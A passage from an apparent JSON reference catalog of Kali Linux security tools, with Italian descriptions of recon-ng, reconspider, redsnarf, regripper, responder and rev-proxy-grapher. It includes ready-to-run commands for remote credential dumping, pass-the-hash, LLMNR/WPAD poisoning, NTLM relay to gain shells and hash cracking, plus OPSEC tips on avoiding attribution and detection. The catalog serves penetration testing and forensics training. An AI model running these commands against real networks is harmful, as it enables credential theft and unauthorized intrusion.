class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Victim Interaction Required:</strong> L'attacco richiede che la vittima visiti volontariamente il dominio malevolo. Social engineering (phishing, malvertising, sito compromesso) è necessario per il delivery.</p><p><strong>Browser Mitigations:</strong> Browser moderni implementano protezioni parziali: alcuni ignorano risposte DNS con TTL 0, altri bloccano risoluzioni a IP privati. L'efficacia varia tra browser e versioni.</p><p><strong>DNS Resolver Behavior:</strong> Alcuni DNS resolver (es. quelli ISP) ignorano TTL bassi e cachano comunque. Questo può rendere l'attacco meno affidabile o richiedere più tempo.</p><p><strong>HTTPS Complications:</strong> Se il servizio interno usa HTTPS, l'attacco fallisce per certificate mismatch. Funziona principalmente contro servizi HTTP plain.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "SSRF"
    ],
    "notes": null
  },
  {
    "id": "recon-ng",
    "name": "recon-ng",
    "version": "5.1.2",
    "icon": "../app/icons/recon-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/recon-ng/",
    "desc": "Framework OSINT modulare con workspace, database e decine di moduli reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Recon-ng</strong> è un framework di reconnaissance open-source con interfaccia stile Metasploit, sviluppato da Tim Tomes (LaNMaSteR53). È progettato per automatizzare e organizzare la fase di OSINT (Open Source Intelligence) di un penetration test o red team engagement. L'architettura modulare con <strong>marketplace</strong> permette di installare moduli specifici per diverse fonti di informazione: DNS, WHOIS, motori di ricerca, social media, database breach, Shodan, VirusTotal, e molti altri. Il sistema di <strong>workspace</strong> separa i progetti con database SQLite dedicati, dove ogni dato raccolto (host, contatti, credenziali, porte) viene normalizzato e correlato. I moduli possono alimentarsi a vicenda: un modulo trova subdomain, un altro risolve gli IP, un terzo cerca porte aperte — tutto automaticamente attraverso il database condiviso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Marketplace Modulare:</strong> Repository di moduli organizzati per categoria: recon (raccolta informazioni), discovery (enumeration attiva), exploitation, reporting. Ogni modulo è indipendente e installabile singolarmente. Il marketplace mostra versione, autore, dipendenze API, e descrizione per ogni modulo.</p><p><strong>Workspace & Database:</strong> Ogni workspace ha un database SQLite con tabelle normalizzate: domains, hosts, contacts, credentials, ports, repositories, vulnerabilities. I risultati di un modulo alimentano automaticamente gli input di altri moduli, creando workflow di reconnaissance concatenati.</p><p><strong>API Key Management:</strong> Sistema centralizzato per gestire API key di servizi esterni: Shodan, VirusTotal, Have I Been Pwned, GitHub, BuiltWith, Censys, Hunter.io, e molti altri. Le chiavi vengono configurate una volta e utilizzate da tutti i moduli pertinenti.</p><p><strong>Reporting Engine:</strong> Moduli di reporting che generano output professionali: HTML navigabile, CSV per spreadsheet, JSON per integrazione. I report includono tutti i dati del workspace con filtri e formattazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Recon-ng usa interfaccia interattiva CLI simile a Metasploit con comandi gerarchici.</p><pre><code># Avvio recon-ng\nrecon-ng\n\n# === WORKSPACE ===\nworkspaces create target_corp\nworkspaces list\nworkspaces load target_corp\n\n# === MARKETPLACE ===\nmarketplace search domains\nmarketplace install recon/domains-hosts/hackertarget\nmarketplace install recon/hosts-hosts/resolve\nmarketplace install recon/domains-contacts/whois_pocs\nmarketplace install reporting/html\n\n# === API KEYS ===\nkeys add shodan_api YOUR_SHODAN_KEY\nkeys add virustotal_api YOUR_VT_KEY\nkeys add hunter_io YOUR_HUNTER_KEY\n\n# === WORKFLOW TIPICO ===\n# 1. Seed database con dominio target\ndb insert domains target.com\n\n# 2. Enumera subdomain\nmodules load recon/domains-hosts/hackertarget\nrun\nmodules load recon/domains-hosts/shodan_hostname\nrun\n\n# 3. Risolvi IP per tutti gli host trovati\nmodules load recon/hosts-hosts/resolve\nrun\n\n# 4. Cerca contatti (email)\nmodules load recon/domains-contacts/whois_pocs\nrun\n\n# 5. Verifica breach\nmodules load recon/contacts-credentials/hibp_breach\nrun\n\n# 6. Risultati\nshow hosts\nshow contacts\nshow credentials\n\n# 7. Report HTML\nmodules load reporting/html\noptions set FILENAME /tmp/recon_report.html\nrun\n\n# Query database custom\ndb query SELECT * FROM hosts WHERE ip_address LIKE '10.%'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Penetration Testing Reconnaissance</strong>, recon-ng struttura la fase di information gathering con un workflow ripetibile e documentabile. Ogni informazione viene salvata nel database, pronta per report e per alimentare fasi successive del test.</p><p>Per <strong>OSINT Investigations</strong>, la capacità di correlare dati da fonti diverse in un unico database rende recon-ng ideale per investigazioni su organizzazioni, individui, o infrastrutture. I workspace separano indagini diverse.</p><p>Per <strong>Attack Surface Mapping</strong>, partendo da un singolo dominio, recon-ng enumera: subdomain, host, IP, porte, tecnologie, contatti email, credenziali leaked. Il risultato è una mappa completa della superficie di attacco.</p><p>Per <strong>Threat Intelligence</strong>, mappatura dell'infrastruttura di threat actors: domini usati per phishing, IP di C2, relazioni tra entità. I moduli di reverse WHOIS e DNS history sono particolarmente utili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Key Attribution:</strong> Le query ai servizi esterni sono associate alla API key usata. In contesti sensibili, usare chiavi dedicate non riconducibili all'operatore. Alcuni servizi loggano anche l'IP sorgente.</p><p><strong>Passive vs Active:</strong> La maggior parte dei moduli è passiva (query a terze parti), ma alcuni moduli discovery eseguono connessioni dirette al target. Verificare la natura di ogni modulo prima dell'esecuzione.</p><p><strong>Rate Limiting:</strong> Servizi come Shodan, VirusTotal, e Hunter.io hanno limiti di query per piano. Query massive possono esaurire il budget API o triggerare blocchi temporanei.</p><p><strong>Data Retention:</strong> Il database SQLite contiene tutti i risultati dell'investigazione. Proteggere i file workspace e cancellarli al termine dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Frameworks"
    ],
    "notes": null
  },
  {
    "id": "reconspider",
    "name": "reconspider",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/reconspider/",
    "desc": "Recon automation framework con IP/domain lookup, port scan, honeypot detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ReconSpider</strong> è un framework Python per automazione della reconnaissance che aggrega informazioni da multiple fonti in un'unica interfaccia. Combina capacità passive (OSINT) e attive (scanning) per fornire un quadro completo di un target. Esegue IP intelligence (geolocation, ASN, blacklist status), domain reconnaissance (DNS, WHOIS, subdomain enumeration), port scanning integrato, e una funzionalità distintiva di honeypot detection per identificare se un target è un sistema di monitoraggio. L'interfaccia interattiva guida l'utente attraverso le diverse opzioni, rendendolo accessibile anche a chi inizia con la reconnaissance.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>IP Intelligence Aggregation:</strong> Per un dato IP, raccoglie: geolocalizzazione (paese, città, ISP), informazioni ASN (Autonomous System Number), verifica presenza in blacklist di spam/malware, reverse DNS lookup, e storico WHOIS. Tutto aggregato da API pubbliche.</p><p><strong>Domain Reconnaissance:</strong> Enumera tutti i DNS record (A, AAAA, MX, NS, TXT, SOA), estrae informazioni WHOIS (registrant, date, nameservers), cerca subdomain tramite diverse tecniche, e identifica tecnologie web utilizzate.</p><p><strong>Integrated Port Scanning:</strong> Scanner TCP integrato per identificare servizi aperti senza dipendere da tool esterni. Permette di passare rapidamente da OSINT passivo a enumeration attiva nello stesso workflow.</p><p><strong>Honeypot Detection:</strong> Funzionalità unica che analizza diversi indicatori per determinare se un IP/host è un honeypot: analisi banner, comportamento anomalo servizi, pattern di risposta tipici di honeypot noti (Cowrie, Dionaea, etc.).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ReconSpider offre interfaccia interattiva guidata e opzioni command-line.</p><pre><code># Avvio interfaccia interattiva\npython reconspider.py\n# Menu guida attraverso le opzioni disponibili\n\n# === IP INTELLIGENCE ===\n# Raccolta informazioni su IP\nreconspider --ip 8.8.8.8\n# Output: geolocation, ASN, blacklist status, reverse DNS\n\n# === DOMAIN RECONNAISSANCE ===\n# Enumerazione completa dominio\nreconspider --domain target.com\n# Output: DNS records, WHOIS, subdomains trovati\n\n# === PORT SCANNING ===\n# Scan porte comuni\nreconspider --port 192.168.1.1\n# Output: porte aperte e servizi identificati\n\n# === HONEYPOT DETECTION ===\n# Verifica se target è honeypot\nreconspider --honeypot 192.168.1.100\n# Output: probabilità honeypot con indicatori\n\n# === COMBINAZIONI ===\n# Recon completa (IP + domain + ports)\nreconspider --full target.com\n\n# Output su file\nreconspider --domain target.com --output results.json\n\n# Workflow tipico:\n# 1. Domain recon per target iniziale\n# 2. IP intel su server identificati\n# 3. Port scan su host interessanti\n# 4. Honeypot check prima di attacchi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Quick Initial Reconnaissance</strong>, quando si ha un nuovo target, ReconSpider fornisce rapidamente le informazioni base necessarie: chi è il registrant, dove sono i server, quali servizi espongono, tutto in pochi comandi.</p><p>Durante <strong>Threat Hunting</strong>, analisi di IP sospetti identificati da SIEM o firewall. La combinazione di geolocation, blacklist check, e honeypot detection aiuta a capire se un IP è legittimo, malevolo, o un honeypot di ricerca.</p><p>Nel <strong>Penetration Testing Preparation</strong>, la fase iniziale di intelligence gathering viene accelerata. Invece di lanciare manualmente whois, dig, nmap, ReconSpider aggrega tutto.</p><p>Per <strong>Red Team Pre-Engagement</strong>, honeypot detection è critica. Attaccare un honeypot compromette l'operazione, rivela TTP, e allerta il target. Verificare sempre prima di procedere con exploitation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active vs Passive:</strong> Port scanning genera traffico diretto verso il target. I log del target registreranno l'IP sorgente. Domain/IP lookup sono passivi e non generano alert sul target.</p><p><strong>API Dependencies:</strong> Alcune funzionalità dipendono da API esterne (geolocation services, blacklist checkers). I provider di questi servizi potrebbero loggare le query.</p><p><strong>Honeypot Limitations:</strong> La detection non è infallibile. Honeypot sofisticati o configurati per sembrare realistici potrebbero non essere identificati. Usare come indicatore, non come certezza.</p><p><strong>Rate Limiting:</strong> Query massive possono essere rate-limited dai servizi esterni. Usare con moderazione su target multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Domain_Recon"
    ],
    "notes": null
  },
  {
    "id": "redsnarf",
    "name": "redsnarf",
    "version": "0~git20170822",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/redsnarf/",
    "desc": "Recupera credenziali Windows da host remoti: SAM, LSA secrets, cached credentials.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RedSnarf</strong> è un tool Python per credential harvesting e post-exploitation su sistemi Windows remoti. Automatizza il dump di credenziali da macchine Windows accessibili via rete: SAM database (hash utenti locali), LSA secrets (password servizi, credenziali auto-logon, chiavi DPAPI), cached domain credentials, e può eseguire pass-the-hash per autenticarsi con hash recuperati su altri target. Particolarmente utile durante la fase di lateral movement quando si hanno credenziali admin locale su più macchine del dominio. RedSnarf usa Impacket sotto il cofano, semplificando operazioni che altrimenti richiederebbero comandi complessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SAM Database Extraction:</strong> Dump remoto del Security Account Manager contenente hash NTLM di tutti gli account locali. Non richiede esecuzione di codice sul target - usa registry save e SMB transfer.</p><p><strong>LSA Secrets Dumping:</strong> Estrae i segreti LSA (Local Security Authority): password di servizi configurati per auto-start, credenziali di auto-logon, chiavi DPAPI system, e altri secrets memorizzati dal sistema.</p><p><strong>Cached Domain Credentials:</strong> Recupera le cached logon credentials (DCC/DCC2 hash) degli ultimi utenti di dominio che si sono autenticati sulla macchina. Utile quando il DC non è raggiungibile.</p><p><strong>Pass-the-Hash Automation:</strong> Una volta recuperati hash NTLM, RedSnarf può usarli automaticamente per autenticarsi su altri target, semplificando il lateral movement senza bisogno di conoscere password in chiaro.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RedSnarf richiede credenziali admin locale sul target (password o hash).</p><pre><code># === AUTENTICAZIONE CON PASSWORD ===\n# Dump credenziali con admin password\npython redsnarf.py -H 192.168.1.100 -u Administrator -p 'Password123' -d WORKGROUP\n# -d: dominio o WORKGROUP per account locali\n\n# === AUTENTICAZIONE CON HASH (PTH) ===\n# Pass-the-Hash per dump credenziali\npython redsnarf.py -H 192.168.1.100 -u admin -hh aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n# -hh: hash formato LM:NTLM\n\n# === DUMP SPECIFICI ===\n# Solo SAM (hash account locali)\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rS\n# -rS: dump SAM\n\n# Solo LSA secrets\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rL\n# -rL: dump LSA secrets\n\n# Cached credentials dominio\npython redsnarf.py -H 192.168.1.100 -u admin -p pass -rC\n# -rC: dump cached creds\n\n# === LATERAL MOVEMENT ===\n# Dump su multipli target\npython redsnarf.py -H 192.168.1.100,192.168.1.101,192.168.1.102 -u admin -p pass\n\n# Da file di host\npython redsnarf.py -f hosts.txt -u admin -hh hash\n\n# === OUTPUT ===\n# Esempio output SAM dump:\n# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# localadmin:1001:aad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::\n\n# Esempio output LSA:\n# Service_Account: 'ServicePassword123'\n# DefaultPassword: 'AutoLogonPass!'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Post-Exploitation Credential Gathering</strong>, dopo aver compromesso una macchina, RedSnarf estrae rapidamente tutte le credenziali disponibili: hash locali, credenziali dominio cached, e secrets di servizi.</p><p>Per <strong>Lateral Movement</strong>, gli hash recuperati da una macchina vengono usati per autenticarsi su altre. RedSnarf automatizza questo ciclo: dump hash da target A, usa per autenticarti su target B, dump hash, repeat.</p><p>Nella <strong>Domain Escalation</strong>, se un domain admin ha mai fatto login su una macchina compromessa, le sue cached credentials sono lì. Crackate con hashcat/john, forniscono domain admin access.</p><p>Per <strong>Service Account Discovery</strong>, LSA secrets spesso contengono password di service account. Questi account tipicamente hanno privilegi elevati e password che non scadono.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Admin Privileges Required:</strong> Dump di SAM/LSA richiede privilegi amministrativi locali sul target. Senza admin, l'operazione fallisce.</p><p><strong>EDR Detection:</strong> L'accesso al registro SAM/SECURITY e il save di questi hive sono operazioni monitorate da EDR moderni. Può triggerare alert e/o essere bloccato.</p><p><strong>Event Logging:</strong> L'autenticazione remota genera Event ID 4624 (logon) sul target. L'accesso a file di sistema può generare ulteriori eventi se auditing è abilitato.</p><p><strong>Network Traffic:</strong> Usa SMB (445) per trasferire i dump. Traffic analysis può rivelare l'estrazione di credenziali. Considerare tunneling se necessario.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "regripper",
    "name": "regripper",
    "version": "3.0~git20221205.d588019",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/regripper/",
    "desc": "Estrae informazioni forensi da registry Windows: utenti, software, timeline eventi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>RegRipper</strong> è il tool di riferimento per l'analisi forense del registry Windows, sviluppato da Harlan Carvey (uno dei massimi esperti di Windows forensics). Il registry Windows è una delle fonti di artefatti forensi più ricche: contiene informazioni su ogni aspetto del sistema operativo e dell'attività utente. RegRipper utilizza un'architettura a plugin in Perl con oltre 200 plugin, ciascuno specializzato nell'estrazione di un tipo specifico di artefatto da uno specifico hive di registro (SAM, SYSTEM, SOFTWARE, SECURITY, NTUSER.DAT, UsrClass.dat). Ogni plugin conosce esattamente le chiavi e i valori da interrogare, i formati di decodifica, e come interpretare i timestamp. L'output è testo strutturato con timestamp, pronto per integrazione in timeline forensi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Plugin Library:</strong> Oltre 200 plugin che coprono: programmi eseguiti (UserAssist, MUICache, AppCompatCache/Shimcache), navigazione cartelle (Shellbags), file recenti (MRU lists, RecentDocs, OpenSaveMRU), dispositivi USB (USBSTOR, MountedDevices, MountPoints2), servizi e driver, programmi installati, profili di rete Wi-Fi, autorun/persistence, e decine di altri artefatti.</p><p><strong>All Hives Supported:</strong> Ogni hive del registry contiene informazioni diverse. SAM: account utenti locali, login history. SYSTEM: servizi, driver, hardware, timezone, ultimo shutdown. SOFTWARE: programmi installati, policy, Windows update. NTUSER.DAT: attività specifica dell'utente. UsrClass.dat: shellbags (navigazione Explorer).</p><p><strong>Timeline Generation:</strong> I plugin estraggono timestamp per ogni artefatto trovato, permettendo la ricostruzione cronologica degli eventi. I timestamp vengono normalizzati in formato UTC per correlazione con altre fonti forensi (log eventi, filesystem timestamps).</p><p><strong>Profile Mode:</strong> Invece di eseguire plugin singolarmente, i \"profili\" raggruppano insiemi di plugin rilevanti per tipo di hive. Il profilo \"ntuser\" esegue tutti i plugin pertinenti a NTUSER.DAT, producendo un report completo dell'attività utente in un singolo comando.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>RegRipper analizza hive di registro esportati (non il sistema live). Gli hive si trovano tipicamente in <code>C:\\Windows\\System32\\config\\</code> e nei profili utente.</p><pre><code># === ANALISI CON PROFILI (consigliato) ===\n# Tutti i plugin per NTUSER.DAT (attività utente)\nrip.pl -r /case/NTUSER.DAT -f ntuser\n\n# Tutti i plugin per SYSTEM\nrip.pl -r /case/SYSTEM -f system\n\n# Tutti i plugin per SOFTWARE\nrip.pl -r /case/SOFTWARE -f software\n\n# Tutti i plugin per SAM (account locali)\nrip.pl -r /case/SAM -f sam\n\n# === PLUGIN SPECIFICI ===\n# Programmi eseguiti (UserAssist - con contatore e timestamp)\nrip.pl -r /case/NTUSER.DAT -p userassist\n\n# Shellbags (cartelle navigate in Explorer)\nrip.pl -r /case/UsrClass.dat -p shellbags\n\n# Dispositivi USB collegati\nrip.pl -r /case/SYSTEM -p usbstor\n\n# Servizi (persistence, malware)\nrip.pl -r /case/SYSTEM -p services\n\n# Autorun (programmi all'avvio)\nrip.pl -r /case/NTUSER.DAT -p run\nrip.pl -r /case/SOFTWARE -p run\n\n# AppCompatCache/Shimcache (programmi eseguiti)\nrip.pl -r /case/SYSTEM -p appcompatcache\n\n# Reti WiFi salvate\nrip.pl -r /case/SOFTWARE -p networklist\n\n# === OUTPUT E REPORTING ===\n# Salva analisi completa su file\nrip.pl -r /case/NTUSER.DAT -f ntuser > user_analysis.txt\n\n# Lista tutti i plugin disponibili\nrip.pl -l\n\n# Info su plugin specifico\nrip.pl -p userassist -l</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics & Incident Response</strong>, il registry è la prima fonte da analizzare durante un incident. RegRipper estrae rapidamente: quali programmi sono stati eseguiti (evidence di malware), quali meccanismi di persistence sono attivi, quando il sistema è stato acceso/spento, e quali dispositivi esterni sono stati collegati.</p><p>Per <strong>Malware Analysis</strong>, identificazione di tutti i meccanismi di persistence installati: chiavi Run, servizi, scheduled tasks, DLL injection, AppInit_DLLs, Winlogon. RegRipper rivela anche il timestamp di installazione del malware.</p><p>Per <strong>User Activity Reconstruction</strong>, ricostruzione dettagliata dell'attività di un utente: documenti aperti, cartelle navigate, programmi eseguiti, ricerche effettuate, dispositivi USB collegati. Essenziale in investigazioni aziendali e legali.</p><p>Per <strong>Timeline Analysis</strong>, i timestamp estratti da RegRipper si integrano con filesystem timestamps e log eventi per creare una super-timeline completa degli eventi sul sistema. Tool come log2timeline/plaso possono incorporare l'output di RegRipper.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Offline Analysis Only:</strong> RegRipper analizza copie degli hive, non il sistema live. Gli hive devono essere estratti prima dell'analisi, tipicamente da un'immagine forense o montando il disco offline. Su sistema live, gli hive sono bloccati e richiedono tool come FTK Imager o raw copy per l'estrazione.</p><p><strong>Plugin Currency:</strong> Nuove versioni di Windows introducono nuove chiavi di registro e artefatti. I plugin devono essere aggiornati per coprire artefatti di Windows 11 e versioni recenti. La community contribuisce costantemente nuovi plugin.</p><p><strong>Interpretation Required:</strong> RegRipper estrae dati grezzi dal registry. L'interpretazione corretta richiede conoscenza degli artefatti Windows. UserAssist con ROT13, Shellbags con GUID, timestamp in formato FILETIME — tutto richiede expertise per interpretazione accurata.</p><p><strong>Complementary Tools:</strong> RegRipper è spesso usato insieme a Registry Explorer (Eric Zimmerman) per navigazione GUI interattiva, e con log2timeline per integrazione in timeline forensi complete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "responder",
    "name": "responder",
    "version": "3.1.7.0",
    "icon": "../app/icons/responder-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/responder/",
    "desc": "Poisoner LLMNR/NBT-NS/mDNS per cattura hash NTLMv1/v2 su reti Windows locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder</strong> è un poisoner per protocolli di name resolution Windows (LLMNR, NBT-NS, mDNS). Cattura hash NTLMv1/v2 rispondendo a richieste di risoluzione nomi, permettendo crack offline o relay per accesso a risorse.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LLMNR/NBT-NS Poisoning:</strong> risponde a query di risoluzione fallite</p><p><strong>Hash Capture:</strong> cattura hash NTLMv1, NTLMv2, NTLMv2-SSP</p><p><strong>Rogue Servers:</strong> SMB, HTTP, FTP, LDAP, SQL server fake</p><p><strong>WPAD Poisoning:</strong> cattura credenziali proxy</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Poisoning completo con WPAD e SMB\nresponder -I eth0 -wrf -P\n\n# Modalità analisi (passive, no poisoning)\nresponder -I eth0 -A -v\n\n# Con ntlmrelayx per relay attack (no SMB/HTTP locali)\nresponder -I eth0 -r -d -w  # disabilita SMB/HTTP\nntlmrelayx.py -t smb://dc.target.com -smb2support\n\n# Targeting specifico con filtering\nresponder -I eth0 --lm --disable-ess\n\n# Combo con MultiRelay per shell\npython MultiRelay.py -t 192.168.1.0/24 -u ALL\nresponder -I eth0 -rv\n\n# DHCP poisoning per WPAD injection\nresponder -I eth0 -D --wpad --wredir\n\n# Cracking hash catturati\ncat /usr/share/responder/logs/*.txt | grep NTLMv2 | cut -d: -f1-6 &gt; hashes.txt\nhashcat -m 5600 hashes.txt wordlist.txt\n\n# IPv6 mode per DHCPv6 poisoning\nresponder -I eth0 -6</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>credential harvesting</strong>, cattura hash su reti Windows.</p><p>Per <strong>relay attacks</strong>, hash per ntlmrelayx a target vulnerabili.</p><p>Per <strong>initial access</strong>, cracking hash per password in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> risposte a broadcast facilmente rilevabili.</p><p><strong>Detection:</strong> SIEM moderni rilevano poisoning.</p><p><strong>Network:</strong> richiede presenza sulla stessa rete/VLAN.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rev-proxy-grapher",
    "name": "rev-proxy-grapher",
    "version": "0~git20180301",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rev-proxy-grapher/",
    "desc": "Visualizza catena reverse proxy tra client e server per mappare infrastruttura web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rev-proxy-grapher</strong> è un tool di reconnaissance che analizza le risposte HTTP di un web server per identificare e visualizzare la catena di reverse proxy, load balancer, CDN e WAF interposti tra il client e il server backend reale. Le moderne architetture web utilizzano multiple layer di proxying: un CDN come Cloudflare o Akamai come primo livello, poi un WAF (Web Application Firewall), poi un load balancer, e infine il server applicativo. Ciascuno di questi layer può aggiungere header HTTP diagnostici (Via, X-Forwarded-For, X-Real-IP, X-Cache, Server, X-Powered-By) che rivelano informazioni sull'infrastruttura. rev-proxy-grapher raccoglie e correla questi header per produrre una mappa visuale della catena proxy, rivelando potenzialmente hostname interni, IP di backend, e tecnologie utilizzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Header Analysis:</strong> Raccoglie e analizza decine di header proxy-related: <code>Via</code> (lista di proxy attraversati), <code>X-Forwarded-For</code> (IP originale e intermedi), <code>X-Real-IP</code>, <code>X-Cache</code> (hit/miss CDN), <code>X-Cache-Hits</code>, <code>Server</code>, <code>X-Powered-By</code>, <code>X-Backend-Server</code>, header specifici di vendor (cf-ray per Cloudflare, x-amz per AWS).</p><p><strong>Proxy Chain Visualization:</strong> Produce una rappresentazione grafica della catena proxy, mostrando ogni hop con tecnologia identificata, hostname/IP se disponibile, e tipo di funzione (CDN, WAF, load balancer, application server). Il grafico può essere esportato come immagine.</p><p><strong>Technology Fingerprinting:</strong> Identifica le tecnologie di proxying basandosi su header signature: Cloudflare (cf-ray, cf-cache-status), AWS (x-amz-cf-id, x-amz-request-id), Akamai (x-akamai-transformed), Nginx (server: nginx), Apache (server: Apache), Varnish (x-varnish), HAProxy, e molti altri.</p><p><strong>Backend Discovery:</strong> In configurazioni non hardened, header come X-Backend-Server, X-Upstream, o errori proxy possono rivelare hostname interni e IP privati dei server backend, informazioni preziose per attacchi mirati che bypassano i layer protettivi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>rev-proxy-grapher analizza le risposte HTTP del target senza necessità di configurazione speciale.</p><pre><code># Analisi base di un URL\nrev-proxy-grapher http://target.com\n\n# Con output grafico su file\nrev-proxy-grapher http://target.com -o infra_map.png\n\n# Modalità verbosa (mostra tutti gli header analizzati)\nrev-proxy-grapher http://target.com -v\n\n# Analisi HTTPS\nrev-proxy-grapher https://secure.target.com\n\n# Test con path diversi (possono rivelare backend diversi)\nrev-proxy-grapher http://target.com/api/\nrev-proxy-grapher http://target.com/static/\nrev-proxy-grapher http://target.com/admin/\n\n# Workflow di discovery completo\n# 1. Analizza infrastruttura proxy\nrev-proxy-grapher https://target.com -o proxy_chain.png\n\n# 2. Verifica header manualmente per conferma\ncurl -I https://target.com 2>/dev/null | grep -i \\\n  'via\\|x-forwarded\\|x-cache\\|server\\|x-powered\\|cf-ray\\|x-backend'\n\n# 3. Test errori per backend leaks\ncurl -H 'Host: invalid' https://target.com\n# Errori proxy possono rivelare backend hostname\n\n# 4. Cerca IP origin dietro CDN\n# Se CDN identificato, cercare IP origin su DNS history</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Infrastructure Reconnaissance</strong>, prima di un penetration test web, comprendere l'architettura dell'infrastruttura è fondamentale. Sapere se c'è un WAF, quale CDN è usato, e quanti layer di proxy separano dall'applicazione guida la scelta delle tecniche di attacco.</p><p>Per <strong>WAF Bypass Planning</strong>, identificare il WAF specifico (Cloudflare, AWS WAF, Akamai) permette di selezionare tecniche di bypass mirate. Trovare l'IP del backend dietro il WAF può permettere di bypassarlo completamente contattando direttamente il server.</p><p>Per <strong>Attack Surface Mapping</strong>, backend diversi possono servire path diversi (API vs static vs admin). L'analisi multi-path può rivelare server backend multipli, ciascuno potenzialmente con vulnerabilità diverse.</p><p>Per <strong>Security Audit</strong>, verifica che l'infrastruttura non esponga informazioni sensibili negli header HTTP. Header come X-Backend-Server con hostname interni, version disclosure nei Server header, o IP privati in X-Forwarded-For sono misconfigurazioni comuni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Semi-Passive:</strong> rev-proxy-grapher effettua normali richieste HTTP al target. Non è completamente passivo (genera traffico verso il target) ma le richieste sono indistinguibili da navigazione browser normale.</p><p><strong>Header Stripping:</strong> Infrastrutture ben configurate rimuovono header diagnostici prima di inviarli al client. In questi casi, rev-proxy-grapher può identificare poco o nulla della catena proxy.</p><p><strong>CDN Limitation:</strong> CDN come Cloudflare mascherano completamente il backend. L'IP origin non è mai esposto negli header. Servono tecniche alternative (DNS history, certificate transparency) per scoprirlo.</p><p><strong>Dynamic Infrastructure:</strong> Cloud environments con auto-scaling possono mostrare backend diversi per la stessa request. Analisi multiple nel tempo danno un quadro più completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "HTTP_Analysis"
    ],
    "notes": null
  },
  {
    "id": "rfcat",
    "name": "rfcat",
    "version": "2.0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/rfcat/",
    "desc": "Framework per hacking RF con RfCat dongle: sniffing, replay, jam su frequenze sub-GHz.",
